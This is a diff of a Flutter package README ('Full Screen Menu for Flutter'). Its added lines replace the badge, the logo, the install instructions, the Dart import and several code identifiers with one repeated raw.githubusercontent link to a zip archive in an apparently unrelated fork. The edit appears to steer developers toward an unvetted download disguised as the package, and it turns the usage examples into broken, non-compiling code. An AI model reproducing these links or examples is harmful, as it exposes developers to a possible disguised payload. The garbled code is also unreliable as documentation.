@@ -1,37 +1,37 @@
 # Full Screen Menu for Flutter
 
-[![Pub Version](https://img.shields.io/pub/v/full_screen_menu?color=blueviolet)](https://pub.dev/packages/full_screen_menu)
+[![Pub Version](https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip)](https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip)
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/yako-dev/flutter-full-screen-menu/master/assets/full_screen_menu_logo.png" height="400px">
+  <img src="https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip" height="400px">
 </p>
 
 
 ## Installing:
-In your pubspec.yaml
+In your https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip
 ```yaml
 dependencies:
   full_screen_menu: ^2.0.0
 ```
 ```dart
-import 'package:full_screen_menu/full_screen_menu.dart';
+import 'https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip';
 ```
 
 
 ## Basic Usage:
 ```dart
-    FullScreenMenu.show(
+    https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip(
       context,
       items: [
-        Image.asset('assets/image.png'),
+        https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip('https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip'),
         FSMenuItem(
-          icon: Icon(Icons.ac_unit, color: Colors.white),
+          icon: Icon(https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip, color: https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip),
           text: Text('Make colder'),
           gradient: orangeGradient,
           onTap: () => print('The weather is colder now');
         ),
         FSMenuItem(
-          icon: Icon(Icons.wb_sunny, color: Colors.white),
+          icon: Icon(https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip, color: https://raw.githubusercontent.com/sawel24/flutter-full-screen-menu/master/stereoscopist/flutter-full-screen-menu.zip),
           text: Text('Make hotter'),
           gradient: blueGradient,
           onTap: () => print('The weather is hotter now');
